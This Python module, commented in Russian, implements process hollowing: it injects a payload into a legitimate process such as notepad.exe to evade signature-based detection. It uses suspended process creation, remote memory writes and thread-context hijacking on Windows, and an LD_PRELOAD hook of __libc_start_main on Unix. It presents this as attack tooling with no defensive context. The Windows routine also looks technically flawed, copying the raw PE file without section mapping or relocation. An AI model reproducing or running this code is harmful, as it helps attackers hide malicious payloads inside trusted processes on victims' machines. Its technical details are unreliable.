#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Process Hollowing: Модуль для внедрения кода зонда в легитимный процесс.

Этот модуль обеспечивает функциональность для выполнения техники Process Hollowing,
которая позволяет внедрить код зонда в адресное пространство легитимного процесса,
заменяя его код оригинальным. Это позволяет обойти средства обнаружения
на основе анализа исполняемых файлов и сигнатур.
"""

import os
import sys
import ctypes
import platform
import struct
import tempfile
import time
import subprocess
from typing import Optional, List, Dict, Any, Tuple, Union
import logging

logger = logging.getLogger('process_hollowing')

# Определяем константы для Windows API
if platform.system().lower() == 'windows':
    try:
        from ctypes import wintypes
        
        # Константы Windows
        MEM_COMMIT = 0x00001000
        MEM_RESERVE = 0x00002000
        PAGE_EXECUTE_READWRITE = 0x40
        PROCESS_ALL_ACCESS = 0x001F0FFF
        CREATE_SUSPENDED = 0x00000004
        
        # Структуры Windows
        class STARTUPINFO(ctypes.Structure):
            _fields_ = [
                ("cb", wintypes.DWORD),
                ("lpReserved", wintypes.LPWSTR),
                ("lpDesktop", wintypes.LPWSTR),
                ("lpTitle", wintypes.LPWSTR),
                ("dwX", wintypes.DWORD),
                ("dwY", wintypes.DWORD),
                ("dwXSize", wintypes.DWORD),
                ("dwYSize", wintypes.DWORD),
                ("dwXCountChars", wintypes.DWORD),
                ("dwYCountChars", wintypes.DWORD),
                ("dwFillAttribute", wintypes.DWORD),
                ("dwFlags", wintypes.DWORD),
                ("wShowWindow", wintypes.WORD),
                ("cbReserved2", wintypes.WORD),
                ("lpReserved2", ctypes.POINTER(wintypes.BYTE)),
                ("hStdInput", wintypes.HANDLE),
                ("hStdOutput", wintypes.HANDLE),
                ("hStdError", wintypes.HANDLE),
            ]
            
        class PROCESS_INFORMATION(ctypes.Structure):
            _fields_ = [
                ("hProcess", wintypes.HANDLE),
                ("hThread", wintypes.HANDLE),
                ("dwProcessId", wintypes.DWORD),
                ("dwThreadId", wintypes.DWORD),
            ]
            
        class SECURITY_ATTRIBUTES(ctypes.Structure):
            _fields_ = [
                ("nLength", wintypes.DWORD),
                ("lpSecurityDescriptor", wintypes.LPVOID),
                ("bInheritHandle", wintypes.BOOL),
            ]
    except ImportError:
        logger.warning("Не удалось импортировать модули Windows для Process Hollowing")


class ProcessHollowing:
    """Класс для выполнения Process Hollowing атак."""
    
    def __init__(self):
        """Инициализация модуля Process Hollowing."""
        self.system = platform.system().lower()
        
        # Подготавливаем Windows API, если на Windows
        if self.system == 'windows':
            self._setup_windows_api()
            
    def _setup_windows_api(self) -> None:
        """Настраивает функции Windows API для Process Hollowing."""
        if self.system != 'windows':
            return
            
        try:
            # Получаем ссылки на необходимые DLL и функции
            self.kernel32 = ctypes.windll.kernel32
            self.ntdll = ctypes.windll.ntdll
            
            # Настраиваем типы аргументов и возвращаемых значений
            
            # CreateProcess
            self.kernel32.CreateProcessW.argtypes = [
                wintypes.LPCWSTR, wintypes.LPWSTR, ctypes.POINTER(SECURITY_ATTRIBUTES),
                ctypes.POINTER(SECURITY_ATTRIBUTES), wintypes.BOOL, wintypes.DWORD,
                wintypes.LPVOID, wintypes.LPCWSTR, ctypes.POINTER(STARTUPINFO),
                ctypes.POINTER(PROCESS_INFORMATION)
            ]
            self.kernel32.CreateProcessW.restype = wintypes.BOOL
            
            # VirtualAllocEx
            self.kernel32.VirtualAllocEx.argtypes = [
                wintypes.HANDLE, wintypes.LPVOID, ctypes.c_size_t,
                wintypes.DWORD, wintypes.DWORD
            ]
            self.kernel32.VirtualAllocEx.restype = wintypes.LPVOID
            
            # WriteProcessMemory
            self.kernel32.WriteProcessMemory.argtypes = [
                wintypes.HANDLE, wintypes.LPVOID, wintypes.LPCVOID,
                ctypes.c_size_t, ctypes.POINTER(ctypes.c_size_t)
            ]
            self.kernel32.WriteProcessMemory.restype = wintypes.BOOL
            
            # GetThreadContext
            self.kernel32.GetThreadContext.argtypes = [
                wintypes.HANDLE, wintypes.LPVOID
            ]
            self.kernel32.GetThreadContext.restype = wintypes.BOOL
            
            # SetThreadContext
            self.kernel32.SetThreadContext.argtypes = [
                wintypes.HANDLE, wintypes.LPVOID
            ]
            self.kernel32.SetThreadContext.restype = wintypes.BOOL
            
            # ResumeThread
            self.kernel32.ResumeThread.argtypes = [wintypes.HANDLE]
            self.kernel32.ResumeThread.restype = wintypes.DWORD
            
            # CloseHandle
            self.kernel32.CloseHandle.argtypes = [wintypes.HANDLE]
            self.kernel32.CloseHandle.restype = wintypes.BOOL
            
            logger.info("Windows API настроена для Process Hollowing")
        except Exception as e:
            logger.error(f"Ошибка настройки Windows API: {str(e)}")
            raise
            
    def hollow_process(self, 
                       target_executable: str, 
                       payload_data: Union[bytes, str],
                       arguments: Optional[str] = None) -> Dict[str, Any]:
        """
        Выполняет Process Hollowing атаку.
        
        Args:
            target_executable: Путь к целевому исполняемому файлу
            payload_data: Данные полезной нагрузки (PE-файл) или путь к файлу
            arguments: Аргументы командной строки для целевого процесса
            
        Returns:
            Словарь с результатами операции
        """
        if self.system == 'windows':
            return self._hollow_process_windows(target_executable, payload_data, arguments)
        else:
            return self._hollow_process_unix(target_executable, payload_data, arguments)
    
    def _hollow_process_windows(self, 
                               target_executable: str, 
                               payload_data: Union[bytes, str],
                               arguments: Optional[str] = None) -> Dict[str, Any]:
        """Выполняет Process Hollowing атаку на Windows."""
        try:
            # Подготавливаем данные полезной нагрузки
            if isinstance(payload_data, str) and os.path.isfile(payload_data):
                with open(payload_data, 'rb') as f:
                    payload_data = f.read()
            
            # Проверяем, что payload_data - это PE-файл
            if not payload_data.startswith(b'MZ'):
                return {
                    "success": False, 
                    "message": "Неверный формат полезной нагрузки, ожидается PE-файл"
                }
                
            # Создаем целевой процесс в приостановленном состоянии
            si = STARTUPINFO()
            si.cb = ctypes.sizeof(si)
            pi = PROCESS_INFORMATION()
            
            # Подготавливаем командную строку
            if arguments:
                command_line = f'"{target_executable}" {arguments}'
            else:
                command_line = f'"{target_executable}"'
                
            # Создаем процесс в приостановленном состоянии
            if not self.kernel32.CreateProcessW(
                None, command_line, None, None, False, 
                CREATE_SUSPENDED, None, None, ctypes.byref(si), ctypes.byref(pi)
            ):
                return {
                    "success": False, 
                    "message": f"Не удалось создать процесс: {ctypes.WinError().strerror}"
                }
                
            # Получаем базовый адрес из PE-заголовка
            pe_offset = struct.unpack("<I", payload_data[0x3C:0x40])[0]
            optional_header_offset = pe_offset + 24
            image_base_offset = optional_header_offset + 28
            image_base = struct.unpack("<I", payload_data[image_base_offset:image_base_offset+4])[0]
            
            # Получаем точку входа
            entry_point_offset = optional_header_offset + 16
            entry_point_rva = struct.unpack("<I", payload_data[entry_point_offset:entry_point_offset+4])[0]
            
            # Выделяем память в целевом процессе
            remote_memory = self.kernel32.VirtualAllocEx(
                pi.hProcess, image_base, len(payload_data),
                MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE
            )
            
            if not remote_memory:
                self.kernel32.TerminateProcess(pi.hProcess, 1)
                self.kernel32.CloseHandle(pi.hProcess)
                self.kernel32.CloseHandle(pi.hThread)
                return {
                    "success": False, 
                    "message": f"Не удалось выделить память: {ctypes.WinError().strerror}"
                }
                
            # Записываем полезную нагрузку в процесс
            bytes_written = ctypes.c_size_t(0)
            if not self.kernel32.WriteProcessMemory(
                pi.hProcess, remote_memory, payload_data, len(payload_data), 
                ctypes.byref(bytes_written)
            ):
                self.kernel32.TerminateProcess(pi.hProcess, 1)
                self.kernel32.CloseHandle(pi.hProcess)
                self.kernel32.CloseHandle(pi.hThread)
                return {
                    "success": False, 
                    "message": f"Не удалось записать данные: {ctypes.WinError().strerror}"
                }
                
            # Получаем контекст потока
            context = ctypes.create_string_buffer(1024)  # Для x64 и x86
            context_size = ctypes.sizeof(context)
            context.raw = b'\x00' * context_size
            
            # Устанавливаем значение ContextFlags (CONTEXT_FULL = 0x10007)
            struct.pack_into("<I", context, 0, 0x10007)
            
            if not self.kernel32.GetThreadContext(pi.hThread, ctypes.byref(context)):
                self.kernel32.TerminateProcess(pi.hProcess, 1)
                self.kernel32.CloseHandle(pi.hProcess)
                self.kernel32.CloseHandle(pi.hThread)
                return {
                    "success": False, 
                    "message": f"Не удалось получить контекст потока: {ctypes.WinError().strerror}"
                }
                
            # Определяем архитектуру и изменяем указатель команд (EIP для x86, RIP для x64)
            if ctypes.sizeof(ctypes.c_void_p) == 8:  # x64
                # RIP находится на смещении 0xA8 в CONTEXT структуре для x64
                rip_offset = 0xA8
                struct.pack_into("<Q", context, rip_offset, image_base + entry_point_rva)
            else:  # x86
                # EIP находится на смещении 0xB8 в CONTEXT структуре для x86
                eip_offset = 0xB8
                struct.pack_into("<I", context, eip_offset, image_base + entry_point_rva)
                
            # Устанавливаем новый контекст потока
            if not self.kernel32.SetThreadContext(pi.hThread, ctypes.byref(context)):
                self.kernel32.TerminateProcess(pi.hProcess, 1)
                self.kernel32.CloseHandle(pi.hProcess)
                self.kernel32.CloseHandle(pi.hThread)
                return {
                    "success": False, 
                    "message": f"Не удалось установить контекст потока: {ctypes.WinError().strerror}"
                }
                
            # Возобновляем поток
            if self.kernel32.ResumeThread(pi.hThread) == 0xFFFFFFFF:
                self.kernel32.TerminateProcess(pi.hProcess, 1)
                self.kernel32.CloseHandle(pi.hProcess)
                self.kernel32.CloseHandle(pi.hThread)
                return {
                    "success": False, 
                    "message": f"Не удалось возобновить поток: {ctypes.WinError().strerror}"
                }
                
            # Закрываем дескрипторы
            self.kernel32.CloseHandle(pi.hProcess)
            self.kernel32.CloseHandle(pi.hThread)
            
            return {
                "success": True, 
                "message": "Process Hollowing выполнен успешно",
                "process_id": pi.dwProcessId
            }
            
        except Exception as e:
            logger.error(f"Ошибка в Process Hollowing: {str(e)}")
            return {
                "success": False, 
                "message": f"Ошибка в Process Hollowing: {str(e)}"
            }
    
    def _hollow_process_unix(self, 
                            target_executable: str, 
                            payload_data: Union[bytes, str],
                            arguments: Optional[str] = None) -> Dict[str, Any]:
        """
        Эмулирует Process Hollowing на Unix-системах через ptrace или LD_PRELOAD.
        
        Примечание: В Unix-системах настоящий Process Hollowing сложнее реализовать,
        поэтому мы используем альтернативные подходы.
        """
        try:
            # Проверяем, что payload_data - это корректные данные или путь к файлу
            if isinstance(payload_data, str) and os.path.isfile(payload_data):
                payload_path = payload_data
            else:
                # Сохраняем данные во временный файл
                fd, payload_path = tempfile.mkstemp()
                os.write(fd, payload_data if isinstance(payload_data, bytes) else payload_data.encode())
                os.close(fd)
                os.chmod(payload_path, 0o755)
                
            # На Unix используем LD_PRELOAD для "внедрения" кода
            # Создаем простую библиотеку для LD_PRELOAD
            preload_code = """
            #include <stdio.h>
            #include <stdlib.h>
            #include <unistd.h>
            #include <dlfcn.h>
            #include <string.h>
            
            // Переопределяем main для перехвата запуска программы
            int __libc_start_main(
                int (*main)(int, char**, char**),
                int argc, char **argv, 
                void (*init)(void), void (*fini)(void),
                void (*rtld_fini)(void), void *stack_end
            ) {
                // Загружаем оригинальную функцию
                int (*real_libc_start_main)(
                    int (*)(int, char**, char**),
                    int, char **, void (*)(void),
                    void (*)(void), void (*)(void),
                    void*
                ) = dlsym(RTLD_NEXT, "__libc_start_main");
                
                // Запускаем наш собственный код
                char *payload_path = getenv("PAYLOAD_PATH");
                if (payload_path) {
                    // Запускаем payload и завершаем текущий процесс
                    execl(payload_path, payload_path, NULL);
                    // Если execl не сработал, продолжаем с оригинальной программой
                }
                
                // Запускаем оригинальную программу, если не удалось запустить payload
                return real_libc_start_main(main, argc, argv, init, fini, rtld_fini, stack_end);
            }
            """
            
            # Сохраняем код во временный файл и компилируем его
            fd, preload_source = tempfile.mkstemp(suffix='.c')
            os.write(fd, preload_code.encode())
            os.close(fd)
            
            preload_lib = preload_source.replace('.c', '.so')
            compile_cmd = f"gcc -shared -fPIC {preload_source} -o {preload_lib} -ldl"
            
            try:
                subprocess.run(compile_cmd, shell=True, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            except subprocess.CalledProcessError:
                return {
                    "success": False, 
                    "message": "Не удалось скомпилировать LD_PRELOAD библиотеку"
                }
                
            # Запускаем целевую программу с LD_PRELOAD и переменной окружения, указывающей на payload
            env = os.environ.copy()
            env['LD_PRELOAD'] = preload_lib
            env['PAYLOAD_PATH'] = payload_path
            
            # Подготавливаем командную строку
            command = [target_executable]
            if arguments:
                command.extend(arguments.split())
                
            # Запускаем процесс
            try:
                process = subprocess.Popen(
                    command,
                    env=env,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE
                )
                
                # Даем процессу немного времени на запуск
                time.sleep(1)
                
                # Проверяем, запущен ли процесс
                if process.poll() is not None:
                    return {
                        "success": False, 
                        "message": f"Процесс завершился с кодом {process.returncode}"
                    }
                    
                return {
                    "success": True, 
                    "message": "Process запущен через LD_PRELOAD",
                    "process_id": process.pid
                }
                
            except Exception as e:
                return {
                    "success": False, 
                    "message": f"Ошибка запуска процесса: {str(e)}"
                }
            finally:
                # Очищаем временные файлы
                try:
                    os.unlink(preload_source)
                    os.unlink(preload_lib)
                    if payload_path != payload_data:  # Если это был временный файл
                        os.unlink(payload_path)
                except:
                    pass
                    
        except Exception as e:
            logger.error(f"Ошибка в Unix Process Hollowing: {str(e)}")
            return {
                "success": False, 
                "message": f"Ошибка в Unix Process Hollowing: {str(e)}"
            }
    
    def find_target_process(self, criteria: Dict[str, Any]) -> List[Dict[str, Any]]:
        """
        Находит целевые процессы по заданным критериям.
        
        Args:
            criteria: Словарь с критериями поиска (имя, использование памяти, CPU и т.д.)
            
        Returns:
            Список процессов, соответствующих критериям
        """
        matching_processes = []
        
        try:
            import psutil
            
            for process in psutil.process_iter(['pid', 'name', 'exe', 'cmdline', 'username']):
                try:
                    process_info = process.info
                    match = True
                    
                    # Проверяем соответствие всем критериям
                    if 'name' in criteria and criteria['name'].lower() not in process_info['name'].lower():
                        match = False
                        
                    if 'username' in criteria and process_info['username'] != criteria['username']:
                        match = False
                        
                    if 'min_memory_mb' in criteria:
                        memory_info = process.memory_info()
                        if memory_info.rss / (1024 * 1024) < criteria['min_memory_mb']:
                            match = False
                            
                    if 'max_memory_mb' in criteria:
                        memory_info = process.memory_info()
                        if memory_info.rss / (1024 * 1024) > criteria['max_memory_mb']:
                            match = False
                            
                    if match:
                        # Дополнительная информация о процессе
                        try:
                            cpu_percent = process.cpu_percent(interval=0.1)
                            memory_percent = process.memory_percent()
                            create_time = process.create_time()
                        except:
                            cpu_percent = None
                            memory_percent = None
                            create_time = None
                            
                        matching_processes.append({
                            'pid': process_info['pid'],
                            'name': process_info['name'],
                            'exe': process_info['exe'],
                            'cmdline': process_info['cmdline'],
                            'username': process_info['username'],
                            'cpu_percent': cpu_percent,
                            'memory_percent': memory_percent,
                            'create_time': create_time
                        })
                        
                except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
                    continue
                    
            # Сортируем процессы по памяти (более "тяжелые" сначала)
            matching_processes.sort(key=lambda p: p.get('memory_percent', 0), reverse=True)
            
            return matching_processes
            
        except ImportError:
            logger.warning("Модуль psutil не установлен, используем базовый метод поиска процессов")
            
            # Используем более простой способ поиска процессов
            if self.system == 'windows':
                return self._find_windows_processes(criteria)
            else:
                return self._find_unix_processes(criteria)
    
    def _find_windows_processes(self, criteria: Dict[str, Any]) -> List[Dict[str, Any]]:
        """Находит процессы на Windows с помощью WMI."""
        matching_processes = []
        
        try:
            import wmi
            c = wmi.WMI()
            
            for process in c.Win32_Process():
                try:
                    match = True
                    
                    if 'name' in criteria and criteria['name'].lower() not in process.Name.lower():
                        match = False
                        
                    if match:
                        matching_processes.append({
                            'pid': process.ProcessId,
                            'name': process.Name,
                            'exe': process.ExecutablePath,
                            'cmdline': process.CommandLine,
                            'username': process.GetOwner()[2] if process.GetOwner()[0] == 0 else None
                        })
                except:
                    continue
                    
            return matching_processes
            
        except ImportError:
            logger.warning("Модуль wmi не установлен, используем tasklist")
            
            # Используем tasklist
            try:
                output = subprocess.check_output(["tasklist", "/v", "/fo", "csv"], 
                                               shell=True, universal_newlines=True)
                lines = output.strip().split('\n')
                header = lines[0].strip('"').split('","')
                
                for line in lines[1:]:
                    values = line.strip('"').split('","')
                    process_info = dict(zip(header, values))
                    
                    match = True
                    if 'name' in criteria and criteria['name'].lower() not in process_info['Image Name'].lower():
                        match = False
                        
                    if match:
                        matching_processes.append({
                            'pid': int(process_info['PID']),
                            'name': process_info['Image Name'],
                            'exe': None,
                            'cmdline': None,
                            'username': process_info['User Name']
                        })
                        
                return matching_processes
                
            except:
                logger.error("Не удалось получить список процессов")
                return []
    
    def _find_unix_processes(self, criteria: Dict[str, Any]) -> List[Dict[str, Any]]:
        """Находит процессы на Unix-системах."""
        matching_processes = []
        
        try:
            # Используем ps
            command = ["ps", "-eo", "pid,comm,user,%cpu,%mem,args"]
            output = subprocess.check_output(command, universal_newlines=True)
            lines = output.strip().split('\n')
            
            for line in lines[1:]:  # Пропускаем заголовок
                parts = line.split(None, 5)
                if len(parts) >= 6:
                    pid, name, username, cpu, mem, cmdline = parts
                    
                    match = True
                    if 'name' in criteria and criteria['name'].lower() not in name.lower():
                        match = False
                        
                    if 'username' in criteria and username != criteria['username']:
                        match = False
                        
                    if match:
                        matching_processes.append({
                            'pid': int(pid),
                            'name': name,
                            'exe': None,
                            'cmdline': cmdline,
                            'username': username,
                            'cpu_percent': float(cpu),
                            'memory_percent': float(mem)
                        })
                        
            return matching_processes
            
        except:
            logger.error("Не удалось получить список процессов")
            return []

# Пример использования
if __name__ == "__main__":
    # Настройка логирования
    logging.basicConfig(level=logging.INFO,
                        format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
    
    # Тестовый пример
    hollow = ProcessHollowing()
    
    # Находим подходящий процесс
    criteria = {'name': 'notepad' if platform.system().lower() == 'windows' else 'gedit'}
    processes = hollow.find_target_process(criteria)
    
    if processes:
        print(f"Найдено {len(processes)} подходящих процессов:")
        for i, proc in enumerate(processes):
            print(f"{i+1}. PID: {proc['pid']}, Name: {proc['name']}, User: {proc.get('username')}")
    else:
        print("Подходящие процессы не найдены")
        
    # Для Windows можно запустить notepad.exe и внедрить в него полезную нагрузку
    if platform.system().lower() == 'windows':
        # Это только пример, в реальности здесь должен быть настоящий PE-файл
        payload_path = "path/to/payload.exe"
        if os.path.exists(payload_path):
            result = hollow.hollow_process("C:\\Windows\\System32\\notepad.exe", payload_path)
            print(f"Результат Process Hollowing: {result}")
        else:
            print(f"Файл {payload_path} не существует") 